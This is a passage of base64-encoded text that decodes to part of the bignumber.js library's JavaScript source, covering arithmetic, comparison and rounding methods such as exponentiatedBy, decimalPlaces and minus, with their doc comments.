XJuIGEgbmV3IEJpZ051bWJlciB3aG9zZSB2YWx1ZSBpcyB0aGUgYWJzb2x1dGUgdmFsdWUgb2YgdGhpcyBCaWdOdW1iZXIuXHJcbiAgICAgKi9cclxuICAgIFAuYWJzb2x1dGVWYWx1ZSA9IFAuYWJzID0gZnVuY3Rpb24gKCkge1xyXG4gICAgICB2YXIgeCA9IG5ldyBCaWdOdW1iZXIodGhpcyk7XHJcbiAgICAgIGlmICh4LnMgPCAwKSB4LnMgPSAxO1xyXG4gICAgICByZXR1cm4geDtcclxuICAgIH07XHJcblxyXG5cclxuICAgIC8qXHJcbiAgICAgKiBSZXR1cm5cclxuICAgICAqICAgMSBpZiB0aGUgdmFsdWUgb2YgdGhpcyBCaWdOdW1iZXIgaXMgZ3JlYXRlciB0aGFuIHRoZSB2YWx1ZSBvZiBCaWdOdW1iZXIoeSwgYiksXHJcbiAgICAgKiAgIC0xIGlmIHRoZSB2YWx1ZSBvZiB0aGlzIEJpZ051bWJlciBpcyBsZXNzIHRoYW4gdGhlIHZhbHVlIG9mIEJpZ051bWJlcih5LCBiKSxcclxuICAgICAqICAgMCBpZiB0aGV5IGhhdmUgdGhlIHNhbWUgdmFsdWUsXHJcbiAgICAgKiAgIG9yIG51bGwgaWYgdGhlIHZhbHVlIG9mIGVpdGhlciBpcyBOYU4uXHJcbiAgICAgKi9cclxuICAgIFAuY29tcGFyZWRUbyA9IGZ1bmN0aW9uICh5LCBiKSB7XHJcbiAgICAgIHJldHVybiBjb21wYXJlKHRoaXMsIG5ldyBCaWdOdW1iZXIoeSwgYikpO1xyXG4gICAgfTtcclxuXHJcblxyXG4gICAgLypcclxuICAgICAqIElmIGRwIGlzIHVuZGVmaW5lZCBvciBudWxsIG9yIHRydWUgb3IgZmFsc2UsIHJldHVybiB0aGUgbnVtYmVyIG9mIGRlY2ltYWwgcGxhY2VzIG9mIHRoZVxyXG4gICAgICogdmFsdWUgb2YgdGhpcyBCaWdOdW1iZXIsIG9yIG51bGwgaWYgdGhlIHZhbHVlIG9mIHRoaXMgQmlnTnVtYmVyIGlzIOWNpEluZmluaXR5IG9yIE5hTi5cclxuICAgICAqXHJcbiAgICAgKiBPdGhlcndpc2UsIGlmIGRwIGlzIGEgbnVtYmVyLCByZXR1cm4gYSBuZXcgQmlnTnVtYmVyIHdob3NlIHZhbHVlIGlzIHRoZSB2YWx1ZSBvZiB0aGlzXHJcbiAgICAgKiBCaWdOdW1iZXIgcm91bmRlZCB0byBhIG1heGltdW0gb2YgZHAgZGVjaW1hbCBwbGFjZXMgdXNpbmcgcm91bmRpbmcgbW9kZSBybSwgb3JcclxuICAgICAqIFJPVU5ESU5HX01PREUgaWYgcm0gaXMgb21pdHRlZC5cclxuICAgICAqXHJcbiAgICAgKiBbZHBdIHtudW1iZXJ9IERlY2ltYWwgcGxhY2VzOiBpbnRlZ2VyLCAwIHRvIE1BWCBpbmNsdXNpdmUuXHJcbiAgICAgKiBbcm1dIHtudW1iZXJ9IFJvdW5kaW5nIG1vZGUuIEludGVnZXIsIDAgdG8gOCBpbmNsdXNpdmUuXHJcbiAgICAgKlxyXG4gICAgICogJ1tCaWdOdW1iZXIgRXJyb3JdIEFyZ3VtZW50IHtub3QgYSBwcmltaXRpdmUgbnVtYmVyfG5vdCBhbiBpbnRlZ2VyfG91dCBvZiByYW5nZX06IHtkcHxybX0nXHJcbiAgICAgKi9cclxuICAgIFAuZGVjaW1hbFBsYWNlcyA9IFAuZHAgPSBmdW5jdGlvbiAoZHAsIHJtKSB7XHJcbiAgICAgIHZhciBjLCBuLCB2LFxyXG4gICAgICAgIHggPSB0aGlzO1xyXG5cclxuICAgICAgaWYgKGRwICE9IG51bGwpIHtcclxuICAgICAgICBpbnRDaGVjayhkcCwgMCwgTUFYKTtcclxuICAgICAgICBpZiAocm0gPT0gbnVsbCkgcm0gPSBST1VORElOR19NT0RFO1xyXG4gICAgICAgIGVsc2UgaW50Q2hlY2socm0sIDAsIDgpO1xyXG5cclxuICAgICAgICByZXR1cm4gcm91bmQobmV3IEJpZ051bWJlcih4KSwgZHAgKyB4LmUgKyAxLCBybSk7XHJcbiAgICAgIH1cclxuXHJcbiAgICAgIGlmICghKGMgPSB4LmMpKSByZXR1cm4gbnVsbDtcclxuICAgICAgbiA9ICgodiA9IGMubGVuZ3RoIC0gMSkgLSBiaXRGbG9vcih0aGlzLmUgLyBMT0dfQkFTRSkpICogTE9HX0JBU0U7XHJcblxyXG4gICAgICAvLyBTdWJ0cmFjdCB0aGUgbnVtYmVyIG9mIHRyYWlsaW5nIHplcm9zIG9mIHRoZSBsYXN0IG51bWJlci5cclxuICAgICAgaWYgKHYgPSBjW3ZdKSBmb3IgKDsgdiAlIDEwID09IDA7IHYgLz0gMTAsIG4tLSk7XHJcbiAgICAgIGlmIChuIDwgMCkgbiA9IDA7XHJcblxyXG4gICAgICByZXR1cm4gbjtcclxuICAgIH07XHJcblxyXG5cclxuICAgIC8qXHJcbiAgICAgKiAgbiAvIDAgPSBJXHJcbiAgICAgKiAgbiAvIE4gPSBOXHJcbiAgICAgKiAgbiAvIEkgPSAwXHJcbiAgICAgKiAgMCAvIG4gPSAwXHJcbiAgICAgKiAgMCAvIDAgPSBOXHJcbiAgICAgKiAgMCAvIE4gPSBOXHJcbiAgICAgKiAgMCAvIEkgPSAwXHJcbiAgICAgKiAgTiAvIG4gPSBOXHJcbiAgICAgKiAgTiAvIDAgPSBOXHJcbiAgICAgKiAgTiAvIE4gPSBOXHJcbiAgICAgKiAgTiAvIEkgPSBOXHJcbiAgICAgKiAgSSAvIG4gPSBJXHJcbiAgICAgKiAgSSAvIDAgPSBJXHJcbiAgICAgKiAgSSAvIE4gPSBOXHJcbiAgICAgKiAgSSAvIEkgPSBOXHJcbiAgICAgKlxyXG4gICAgICogUmV0dXJuIGEgbmV3IEJpZ051bWJlciB3aG9zZSB2YWx1ZSBpcyB0aGUgdmFsdWUgb2YgdGhpcyBCaWdOdW1iZXIgZGl2aWRlZCBieSB0aGUgdmFsdWUgb2ZcclxuICAgICAqIEJpZ051bWJlcih5LCBiKSwgcm91bmRlZCBhY2NvcmRpbmcgdG8gREVDSU1BTF9QTEFDRVMgYW5kIFJPVU5ESU5HX01PREUuXHJcbiAgICAgKi9cclxuICAgIFAuZGl2aWRlZEJ5ID0gUC5kaXYgPSBmdW5jdGlvbiAoeSwgYikge1xyXG4gICAgICByZXR1cm4gZGl2KHRoaXMsIG5ldyBCaWdOdW1iZXIoeSwgYiksIERFQ0lNQUxfUExBQ0VTLCBST1VORElOR19NT0RFKTtcclxuICAgIH07XHJcblxyXG5cclxuICAgIC8qXHJcbiAgICAgKiBSZXR1cm4gYSBuZXcgQmlnTnVtYmVyIHdob3NlIHZhbHVlIGlzIHRoZSBpbnRlZ2VyIHBhcnQgb2YgZGl2aWRpbmcgdGhlIHZhbHVlIG9mIHRoaXNcclxuICAgICAqIEJpZ051bWJlciBieSB0aGUgdmFsdWUgb2YgQmlnTnVtYmVyKHksIGIpLlxyXG4gICAgICovXHJcbiAgICBQLmRpdmlkZWRUb0ludGVnZXJCeSA9IFAuaWRpdiA9IGZ1bmN0aW9uICh5LCBiKSB7XHJcbiAgICAgIHJldHVybiBkaXYodGhpcywgbmV3IEJpZ051bWJlcih5LCBiKSwgMCwgMSk7XHJcbiAgICB9O1xyXG5cclxuXHJcbiAgICAvKlxyXG4gICAgICogUmV0dXJuIGEgQmlnTnVtYmVyIHdob3NlIHZhbHVlIGlzIHRoZSB2YWx1ZSBvZiB0aGlzIEJpZ051bWJlciBleHBvbmVudGlhdGVkIGJ5IG4uXHJcbiAgICAgKlxyXG4gICAgICogSWYgbSBpcyBwcmVzZW50LCByZXR1cm4gdGhlIHJlc3VsdCBtb2R1bG8gbS5cclxuICAgICAqIElmIG4gaXMgbmVnYXRpdmUgcm91bmQgYWNjb3JkaW5nIHRvIERFQ0lNQUxfUExBQ0VTIGFuZCBST1VORElOR19NT0RFLlxyXG4gICAgICogSWYgUE9XX1BSRUNJU0lPTiBpcyBub24temVybyBhbmQgbSBpcyBub3QgcHJlc2VudCwgcm91bmQgdG8gUE9XX1BSRUNJU0lPTiB1c2luZyBST1VORElOR19NT0RFLlxyXG4gICAgICpcclxuICAgICAqIFRoZSBtb2R1bGFyIHBvd2VyIG9wZXJhdGlvbiB3b3JrcyBlZmZpY2llbnRseSB3aGVuIHgsIG4sIGFuZCBtIGFyZSBpbnRlZ2Vycywgb3RoZXJ3aXNlIGl0XHJcbiAgICAgKiBpcyBlcXVpdmFsZW50IHRvIGNhbGN1bGF0aW5nIHguZXhwb25lbnRpYXRlZEJ5KG4pLm1vZHVsbyhtKSB3aXRoIGEgUE9XX1BSRUNJU0lPTiBvZiAwLlxyXG4gICAgICpcclxuICAgICAqIG4ge251bWJlcnxzdHJpbmd8QmlnTnVtYmVyfSBUaGUgZXhwb25lbnQuIEFuIGludGVnZXIuXHJcbiAgICAgKiBbbV0ge251bWJlcnxzdHJpbmd8QmlnTnVtYmVyfSBUaGUgbW9kdWx1cy5cclxuICAgICAqXHJcbiAgICAgKiAnW0JpZ051bWJlciBFcnJvcl0gRXhwb25lbnQgbm90IGFuIGludGVnZXI6IHtufSdcclxuICAgICAqL1xyXG4gICAgUC5leHBvbmVudGlhdGVkQnkgPSBQLnBvdyA9IGZ1bmN0aW9uIChuLCBtKSB7XHJcbiAgICAgIHZhciBoYWxmLCBpc01vZEV4cCwgaywgbW9yZSwgbklzQmlnLCBuSXNOZWcsIG5Jc09kZCwgeSxcclxuICAgICAgICB4ID0gdGhpcztcclxuXHJcbiAgICAgIG4gPSBuZXcgQmlnTnVtYmVyKG4pO1xyXG5cclxuICAgICAgLy8gQWxsb3cgTmFOIGFuZCDljaRJbmZpbml0eSwgYnV0IG5vdCBvdGhlciBub24taW50ZWdlcnMuXHJcbiAgICAgIGlmIChuLmMgJiYgIW4uaXNJbnRlZ2VyKCkpIHtcclxuICAgICAgICB0aHJvdyBFcnJvclxyXG4gICAgICAgICAgKGJpZ251bWJlckVycm9yICsgJ0V4cG9uZW50IG5vdCBhbiBpbnRlZ2VyOiAnICsgbik7XHJcbiAgICAgIH1cclxuXHJcbiAgICAgIGlmIChtICE9IG51bGwpIG0gPSBuZXcgQmlnTnVtYmVyKG0pO1xyXG5cclxuICAgICAgLy8gRXhwb25lbnQgb2YgTUFYX1NBRkVfSU5URUdFUiBpcyAxNS5cclxuICAgICAgbklzQmlnID0gbi5lID4gMTQ7XHJcblxyXG4gICAgICAvLyBJZiB4IGlzIE5hTiwg5Y2kSW5maW5pdHksIOWNpDAgb3Ig5Y2kMSwgb3IgbiBpcyDljaRJbmZpbml0eSwgTmFOIG9yIOWNpDAuXHJcbiAgICAgIGlmICgheC5jIHx8ICF4LmNbMF0gfHwgeC5jWzBdID09IDEgJiYgIXguZSAmJiB4LmMubGVuZ3RoID09IDEgfHwgIW4uYyB8fCAhbi5jWzBdKSB7XHJcblxyXG4gICAgICAgIC8vIFRoZSBzaWduIG9mIHRoZSByZXN1bHQgb2YgcG93IHdoZW4geCBpcyBuZWdhdGl2ZSBkZXBlbmRzIG9uIHRoZSBldmVubmVzcyBvZiBuLlxyXG4gICAgICAgIC8vIElmICtuIG92ZXJmbG93cyB0byDljaRJbmZpbml0eSwgdGhlIGV2ZW5uZXNzIG9mIG4gd291bGQgYmUgbm90IGJlIGtub3duLlxyXG4gICAgICAgIHkgPSBuZXcgQmlnTnVtYmVyKE1hdGgucG93KCt4LnZhbHVlT2YoKSwgbklzQmlnID8gMiAtIGlzT2RkKG4pIDogK24pKTtcclxuICAgICAgICByZXR1cm4gbSA/IHkubW9kKG0pIDogeTtcclxuICAgICAgfVxyXG5cclxuICAgICAgbklzTmVnID0gbi5zIDwgMDtcclxuXHJcbiAgICAgIGlmIChtKSB7XHJcblxyXG4gICAgICAgIC8vIHggJSBtIHJldHVybnMgTmFOIGlmIGFicyhtKSBpcyB6ZXJvLCBvciBtIGlzIE5hTi5cclxuICAgICAgICBpZiAobS5jID8gIW0uY1swXSA6ICFtLnMpIHJldHVybiBuZXcgQmlnTnVtYmVyKE5hTik7XHJcblxyXG4gICAgICAgIGlzTW9kRXhwID0gIW5Jc05lZyAmJiB4LmlzSW50ZWdlcigpICYmIG0uaXNJbnRlZ2VyKCk7XHJcblxyXG4gICAgICAgIGlmIChpc01vZEV4cCkgeCA9IHgubW9kKG0pO1xyXG5cclxuICAgICAgLy8gT3ZlcmZsb3cgdG8g5Y2kSW5maW5pdHk6ID49MioqMWUxMCBvciA+PTEuMDAwMDAyNCoqMWUxNS5cclxuICAgICAgLy8gVW5kZXJmbG93IHRvIOWNpDA6IDw9MC43OSoqMWUxMCBvciA8PTAuOTk5OTk3NSoqMWUxNS5cclxuICAgICAgfSBlbHNlIGlmIChuLmUgPiA5ICYmICh4LmUgPiAwIHx8IHguZSA8IC0xIHx8ICh4LmUgPT0gMFxyXG4gICAgICAgIC8vIFsxLCAyNDAwMDAwMDBdXHJcbiAgICAgICAgPyB4LmNbMF0gPiAxIHx8IG5Jc0JpZyAmJiB4LmNbMV0gPj0gMjRlN1xyXG4gICAgICAgIC8vIFs4MDAwMDAwMDAwMDAwMF0gIFs5OTk5OTc1MDAwMDAwMF1cclxuICAgICAgICA6IHguY1swXSA8IDhlMTMgfHwgbklzQmlnICYmIHguY1swXSA8PSA5OTk5OTc1ZTcpKSkge1xyXG5cclxuICAgICAgICAvLyBJZiB4IGlzIG5lZ2F0aXZlIGFuZCBuIGlzIG9kZCwgayA9IC0wLCBlbHNlIGsgPSAwLlxyXG4gICAgICAgIGsgPSB4LnMgPCAwICYmIGlzT2RkKG4pID8gLTAgOiAwO1xyXG5cclxuICAgICAgICAvLyBJZiB4ID49IDEsIGsgPSDljaRJbmZpbml0eS5cclxuICAgICAgICBpZiAoeC5lID4gLTEpIGsgPSAxIC8gaztcclxuXHJcbiAgICAgICAgLy8gSWYgbiBpcyBuZWdhdGl2ZSByZXR1cm4g5Y2kMCwgZWxzZSByZXR1cm4g5Y2kSW5maW5pdHkuXHJcbiAgICAgICAgcmV0dXJuIG5ldyBCaWdOdW1iZXIobklzTmVnID8gMSAvIGsgOiBrKTtcclxuXHJcbiAgICAgIH0gZWxzZSBpZiAoUE9XX1BSRUNJU0lPTikge1xyXG5cclxuICAgICAgICAvLyBUcnVuY2F0aW5nIGVhY2ggY29lZmZpY2llbnQgYXJyYXkgdG8gYSBsZW5ndGggb2YgayBhZnRlciBlYWNoIG11bHRpcGxpY2F0aW9uXHJcbiAgICAgICAgLy8gZXF1YXRlcyB0byB0cnVuY2F0aW5nIHNpZ25pZmljYW50IGRpZ2l0cyB0byBQT1dfUFJFQ0lTSU9OICsgWzI4LCA0MV0sXHJcbiAgICAgICAgLy8gaS5lLiB0aGVyZSB3aWxsIGJlIGEgbWluaW11bSBvZiAyOCBndWFyZCBkaWdpdHMgcmV0YWluZWQuXHJcbiAgICAgICAgayA9IG1hdGhjZWlsKFBPV19QUkVDSVNJT04gLyBMT0dfQkFTRSArIDIpO1xyXG4gICAgICB9XHJcblxyXG4gICAgICBpZiAobklzQmlnKSB7XHJcbiAgICAgICAgaGFsZiA9IG5ldyBCaWdOdW1iZXIoMC41KTtcclxuICAgICAgICBuSXNPZGQgPSBpc09kZChuKTtcclxuICAgICAgfSBlbHNlIHtcclxuICAgICAgICBuSXNPZGQgPSBuICUgMjtcclxuICAgICAgfVxyXG5cclxuICAgICAgaWYgKG5Jc05lZykgbi5zID0gMTtcclxuXHJcbiAgICAgIHkgPSBuZXcgQmlnTnVtYmVyKE9ORSk7XHJcblxyXG4gICAgICAvLyBQZXJmb3JtcyA1NCBsb29wIGl0ZXJhdGlvbnMgZm9yIG4gb2YgOTAwNzE5OTI1NDc0MDk5MS5cclxuICAgICAgZm9yICg7IDspIHtcclxuXHJcbiAgICAgICAgaWYgKG5Jc09kZCkge1xyXG4gICAgICAgICAgeSA9IHkudGltZXMoeCk7XHJcbiAgICAgICAgICBpZiAoIXkuYykgYnJlYWs7XHJcblxyXG4gICAgICAgICAgaWYgKGspIHtcclxuICAgICAgICAgICAgaWYgKHkuYy5sZW5ndGggPiBrKSB5LmMubGVuZ3RoID0gaztcclxuICAgICAgICAgIH0gZWxzZSBpZiAoaXNNb2RFeHApIHtcclxuICAgICAgICAgICAgeSA9IHkubW9kKG0pOyAgICAvL3kgPSB5Lm1pbnVzKGRpdih5LCBtLCAwLCBNT0RVTE9fTU9ERSkudGltZXMobSkpO1xyXG4gICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgaWYgKG5Jc0JpZykge1xyXG4gICAgICAgICAgbiA9IG4udGltZXMoaGFsZik7XHJcbiAgICAgICAgICByb3VuZChuLCBuLmUgKyAxLCAxKTtcclxuICAgICAgICAgIGlmICghbi5jWzBdKSBicmVhaztcclxuICAgICAgICAgIG5Jc0JpZyA9IG4uZSA+IDE0O1xyXG4gICAgICAgICAgbklzT2RkID0gaXNPZGQobik7XHJcbiAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgIG4gPSBtYXRoZmxvb3IobiAvIDIpO1xyXG4gICAgICAgICAgaWYgKCFuKSBicmVhaztcclxuICAgICAgICAgIG5Jc09kZCA9IG4gJSAyO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgeCA9IHgudGltZXMoeCk7XHJcblxyXG4gICAgICAgIGlmIChrKSB7XHJcbiAgICAgICAgICBpZiAoeC5jICYmIHguYy5sZW5ndGggPiBrKSB4LmMubGVuZ3RoID0gaztcclxuICAgICAgICB9IGVsc2UgaWYgKGlzTW9kRXhwKSB7XHJcbiAgICAgICAgICB4ID0geC5tb2QobSk7ICAgIC8veCA9IHgubWludXMoZGl2KHgsIG0sIDAsIE1PRFVMT19NT0RFKS50aW1lcyhtKSk7XHJcbiAgICAgICAgfVxyXG4gICAgICB9XHJcblxyXG4gICAgICBpZiAoaXNNb2RFeHApIHJldHVybiB5O1xyXG4gICAgICBpZiAobklzTmVnKSB5ID0gT05FLmRpdih5KTtcclxuXHJcbiAgICAgIHJldHVybiBtID8geS5tb2QobSkgOiBrID8gcm91bmQoeSwgUE9XX1BSRUNJU0lPTiwgUk9VTkRJTkdfTU9ERSwgbW9yZSkgOiB5O1xyXG4gICAgfTtcclxuXHJcblxyXG4gICAgLypcclxuICAgICAqIFJldHVybiBhIG5ldyBCaWdOdW1iZXIgd2hvc2UgdmFsdWUgaXMgdGhlIHZhbHVlIG9mIHRoaXMgQmlnTnVtYmVyIHJvdW5kZWQgdG8gYW4gaW50ZWdlclxyXG4gICAgICogdXNpbmcgcm91bmRpbmcgbW9kZSBybSwgb3IgUk9VTkRJTkdfTU9ERSBpZiBybSBpcyBvbWl0dGVkLlxyXG4gICAgICpcclxuICAgICAqIFtybV0ge251bWJlcn0gUm91bmRpbmcgbW9kZS4gSW50ZWdlciwgMCB0byA4IGluY2x1c2l2ZS5cclxuICAgICAqXHJcbiAgICAgKiAnW0JpZ051bWJlciBFcnJvcl0gQXJndW1lbnQge25vdCBhIHByaW1pdGl2ZSBudW1iZXJ8bm90IGFuIGludGVnZXJ8b3V0IG9mIHJhbmdlfToge3JtfSdcclxuICAgICAqL1xyXG4gICAgUC5pbnRlZ2VyVmFsdWUgPSBmdW5jdGlvbiAocm0pIHtcclxuICAgICAgdmFyIG4gPSBuZXcgQmlnTnVtYmVyKHRoaXMpO1xyXG4gICAgICBpZiAocm0gPT0gbnVsbCkgcm0gPSBST1VORElOR19NT0RFO1xyXG4gICAgICBlbHNlIGludENoZWNrKHJtLCAwLCA4KTtcclxuICAgICAgcmV0dXJuIHJvdW5kKG4sIG4uZSArIDEsIHJtKTtcclxuICAgIH07XHJcblxyXG5cclxuICAgIC8qXHJcbiAgICAgKiBSZXR1cm4gdHJ1ZSBpZiB0aGUgdmFsdWUgb2YgdGhpcyBCaWdOdW1iZXIgaXMgZXF1YWwgdG8gdGhlIHZhbHVlIG9mIEJpZ051bWJlcih5LCBiKSxcclxuICAgICAqIG90aGVyd2lzZSByZXR1cm4gZmFsc2UuXHJcbiAgICAgKi9cclxuICAgIFAuaXNFcXVhbFRvID0gUC5lcSA9IGZ1bmN0aW9uICh5LCBiKSB7XHJcbiAgICAgIHJldHVybiBjb21wYXJlKHRoaXMsIG5ldyBCaWdOdW1iZXIoeSwgYikpID09PSAwO1xyXG4gICAgfTtcclxuXHJcblxyXG4gICAgLypcclxuICAgICAqIFJldHVybiB0cnVlIGlmIHRoZSB2YWx1ZSBvZiB0aGlzIEJpZ051bWJlciBpcyBhIGZpbml0ZSBudW1iZXIsIG90aGVyd2lzZSByZXR1cm4gZmFsc2UuXHJcbiAgICAgKi9cclxuICAgIFAuaXNGaW5pdGUgPSBmdW5jdGlvbiAoKSB7XHJcbiAgICAgIHJldHVybiAhIXRoaXMuYztcclxuICAgIH07XHJcblxyXG5cclxuICAgIC8qXHJcbiAgICAgKiBSZXR1cm4gdHJ1ZSBpZiB0aGUgdmFsdWUgb2YgdGhpcyBCaWdOdW1iZXIgaXMgZ3JlYXRlciB0aGFuIHRoZSB2YWx1ZSBvZiBCaWdOdW1iZXIoeSwgYiksXHJcbiAgICAgKiBvdGhlcndpc2UgcmV0dXJuIGZhbHNlLlxyXG4gICAgICovXHJcbiAgICBQLmlzR3JlYXRlclRoYW4gPSBQLmd0ID0gZnVuY3Rpb24gKHksIGIpIHtcclxuICAgICAgcmV0dXJuIGNvbXBhcmUodGhpcywgbmV3IEJpZ051bWJlcih5LCBiKSkgPiAwO1xyXG4gICAgfTtcclxuXHJcblxyXG4gICAgLypcclxuICAgICAqIFJldHVybiB0cnVlIGlmIHRoZSB2YWx1ZSBvZiB0aGlzIEJpZ051bWJlciBpcyBncmVhdGVyIHRoYW4gb3IgZXF1YWwgdG8gdGhlIHZhbHVlIG9mXHJcbiAgICAgKiBCaWdOdW1iZXIoeSwgYiksIG90aGVyd2lzZSByZXR1cm4gZmFsc2UuXHJcbiAgICAgKi9cclxuICAgIFAuaXNHcmVhdGVyVGhhbk9yRXF1YWxUbyA9IFAuZ3RlID0gZnVuY3Rpb24gKHksIGIpIHtcclxuICAgICAgcmV0dXJuIChiID0gY29tcGFyZSh0aGlzLCBuZXcgQmlnTnVtYmVyKHksIGIpKSkgPT09IDEgfHwgYiA9PT0gMDtcclxuXHJcbiAgICB9O1xyXG5cclxuXHJcbiAgICAvKlxyXG4gICAgICogUmV0dXJuIHRydWUgaWYgdGhlIHZhbHVlIG9mIHRoaXMgQmlnTnVtYmVyIGlzIGFuIGludGVnZXIsIG90aGVyd2lzZSByZXR1cm4gZmFsc2UuXHJcbiAgICAgKi9cclxuICAgIFAuaXNJbnRlZ2VyID0gZnVuY3Rpb24gKCkge1xyXG4gICAgICByZXR1cm4gISF0aGlzLmMgJiYgYml0Rmxvb3IodGhpcy5lIC8gTE9HX0JBU0UpID4gdGhpcy5jLmxlbmd0aCAtIDI7XHJcbiAgICB9O1xyXG5cclxuXHJcbiAgICAvKlxyXG4gICAgICogUmV0dXJuIHRydWUgaWYgdGhlIHZhbHVlIG9mIHRoaXMgQmlnTnVtYmVyIGlzIGxlc3MgdGhhbiB0aGUgdmFsdWUgb2YgQmlnTnVtYmVyKHksIGIpLFxyXG4gICAgICogb3RoZXJ3aXNlIHJldHVybiBmYWxzZS5cclxuICAgICAqL1xyXG4gICAgUC5pc0xlc3NUaGFuID0gUC5sdCA9IGZ1bmN0aW9uICh5LCBiKSB7XHJcbiAgICAgIHJldHVybiBjb21wYXJlKHRoaXMsIG5ldyBCaWdOdW1iZXIoeSwgYikpIDwgMDtcclxuICAgIH07XHJcblxyXG5cclxuICAgIC8qXHJcbiAgICAgKiBSZXR1cm4gdHJ1ZSBpZiB0aGUgdmFsdWUgb2YgdGhpcyBCaWdOdW1iZXIgaXMgbGVzcyB0aGFuIG9yIGVxdWFsIHRvIHRoZSB2YWx1ZSBvZlxyXG4gICAgICogQmlnTnVtYmVyKHksIGIpLCBvdGhlcndpc2UgcmV0dXJuIGZhbHNlLlxyXG4gICAgICovXHJcbiAgICBQLmlzTGVzc1RoYW5PckVxdWFsVG8gPSBQLmx0ZSA9IGZ1bmN0aW9uICh5LCBiKSB7XHJcbiAgICAgIHJldHVybiAoYiA9IGNvbXBhcmUodGhpcywgbmV3IEJpZ051bWJlcih5LCBiKSkpID09PSAtMSB8fCBiID09PSAwO1xyXG4gICAgfTtcclxuXHJcblxyXG4gICAgLypcclxuICAgICAqIFJldHVybiB0cnVlIGlmIHRoZSB2YWx1ZSBvZiB0aGlzIEJpZ051bWJlciBpcyBOYU4sIG90aGVyd2lzZSByZXR1cm4gZmFsc2UuXHJcbiAgICAgKi9cclxuICAgIFAuaXNOYU4gPSBmdW5jdGlvbiAoKSB7XHJcbiAgICAgIHJldHVybiAhdGhpcy5zO1xyXG4gICAgfTtcclxuXHJcblxyXG4gICAgLypcclxuICAgICAqIFJldHVybiB0cnVlIGlmIHRoZSB2YWx1ZSBvZiB0aGlzIEJpZ051bWJlciBpcyBuZWdhdGl2ZSwgb3RoZXJ3aXNlIHJldHVybiBmYWxzZS5cclxuICAgICAqL1xyXG4gICAgUC5pc05lZ2F0aXZlID0gZnVuY3Rpb24gKCkge1xyXG4gICAgICByZXR1cm4gdGhpcy5zIDwgMDtcclxuICAgIH07XHJcblxyXG5cclxuICAgIC8qXHJcbiAgICAgKiBSZXR1cm4gdHJ1ZSBpZiB0aGUgdmFsdWUgb2YgdGhpcyBCaWdOdW1iZXIgaXMgcG9zaXRpdmUsIG90aGVyd2lzZSByZXR1cm4gZmFsc2UuXHJcbiAgICAgKi9cclxuICAgIFAuaXNQb3NpdGl2ZSA9IGZ1bmN0aW9uICgpIHtcclxuICAgICAgcmV0dXJuIHRoaXMucyA+IDA7XHJcbiAgICB9O1xyXG5cclxuXHJcbiAgICAvKlxyXG4gICAgICogUmV0dXJuIHRydWUgaWYgdGhlIHZhbHVlIG9mIHRoaXMgQmlnTnVtYmVyIGlzIDAgb3IgLTAsIG90aGVyd2lzZSByZXR1cm4gZmFsc2UuXHJcbiAgICAgKi9cclxuICAgIFAuaXNaZXJvID0gZnVuY3Rpb24gKCkge1xyXG4gICAgICByZXR1cm4gISF0aGlzLmMgJiYgdGhpcy5jWzBdID09IDA7XHJcbiAgICB9O1xyXG5cclxuXHJcbiAgICAvKlxyXG4gICAgICogIG4gLSAwID0gblxyXG4gICAgICogIG4gLSBOID0gTlxyXG4gICAgICogIG4gLSBJID0gLUlcclxuICAgICAqICAwIC0gbiA9IC1uXHJcbiAgICAgKiAgMCAtIDAgPSAwXHJcbiAgICAgKiAgMCAtIE4gPSBOXHJcbiAgICAgKiAgMCAtIEkgPSAtSVxyXG4gICAgICogIE4gLSBuID0gTlxyXG4gICAgICogIE4gLSAwID0gTlxyXG4gICAgICogIE4gLSBOID0gTlxyXG4gICAgICogIE4gLSBJID0gTlxyXG4gICAgICogIEkgLSBuID0gSVxyXG4gICAgICogIEkgLSAwID0gSVxyXG4gICAgICogIEkgLSBOID0gTlxyXG4gICAgICogIEkgLSBJID0gTlxyXG4gICAgICpcclxuICAgICAqIFJldHVybiBhIG5ldyBCaWdOdW1iZXIgd2hvc2UgdmFsdWUgaXMgdGhlIHZhbHVlIG9mIHRoaXMgQmlnTnVtYmVyIG1pbnVzIHRoZSB2YWx1ZSBvZlxyXG4gICAgICogQmlnTnVtYmVyKHksIGIpLlxyXG4gICAgICovXHJcbiAgICBQLm1pbnVzID0gZnVuY3Rpb24gKHksIGIpIHtcclxuICAgICAgdmFyIGksIGosIHQsIHhMVHksXHJcbiAgICAgICAgeCA9IHRoaXMsXHJcbiAgICAgICAgYSA9IHgucztcclxuXHJcbiAgICAgIHkgPSBuZXcgQmlnTnVtYmVyKHksIGIpO1xyXG4gICAgICBiID0geS5zO1xyXG5cclxuICAgICAgLy8gRWl0aGVyIE5hTj9cclxuICAgICAgaWYgKCFhIHx8ICFiKSByZXR1cm4gbmV3IEJpZ051bWJlcihOYU4pO1xyXG5cclxuICAgICAgLy8gU2lnbnMgZGlmZmVyP1xyXG4gICAgICBpZiAoYSAhPSBiKSB7XHJcbiAgICAgICAgeS5zID0gLWI7XHJcbiAgICAgICAgcmV0dXJuIHgucGx1cyh5KTtcclxuICAgICAgfVxyXG5cclxuICAgICAgdmFyIHhlID0geC5lIC8gTE9HX0JBU0UsXHJcbiAgICAgICAgeWUgPSB5LmUgLyBMT0dfQkFTRSxcclxuICAgICAgICB4YyA9IHguYyxcclxuICAgICAgICB5YyA9IHkuYztcclxuXHJcbiAgICAgIGlmICgheGUgfHwgIXllKSB7XHJcblxyXG4gICAgICAgIC8vIEVpdGhlciBJbmZpbml0eT9cclxuICAgICAgICBpZiAoIXhjIHx8ICF5YykgcmV0dXJuIHhjID8gKHkucyA9IC1iLCB5KSA6IG5ldyBCaWdOdW1iZXIoeWMgPyB4IDogTmFOKTtcclxuXHJcbiAgICAgICAgLy8gRWl0aGVyIHplcm8/XHJcbiAgICAgICAgaWYgKCF4Y1swXSB8fCAheWNbMF0pIHtcclxuXHJcbiAgICAgICAgICAvLyBSZXR1cm4geSBpZiB5IGlzIG5vbi16ZXJvLCB4IGlmIHggaXMgbm9uLXplcm8sIG9yIHplcm8gaWYgYm90aCBhcmUgemVyby5cclxuICAgICAgICAgIHJldHVybiB5Y1swXSA/ICh5LnMgPSAtYiwgeSkgOiBuZXcgQmlnTnVtYmVyKHhjWzBdID8geCA6XHJcblxyXG4gICAgICAgICAgIC8vIElFRUUgNzU0ICgyMDA4KSA2LjM6IG4gLSBuID0gLTAgd2hlbiByb3VuZGluZyB0byAtSW5maW5pdHlcclxuICAgICAgICAgICBST1VORElOR19NT0RFID09I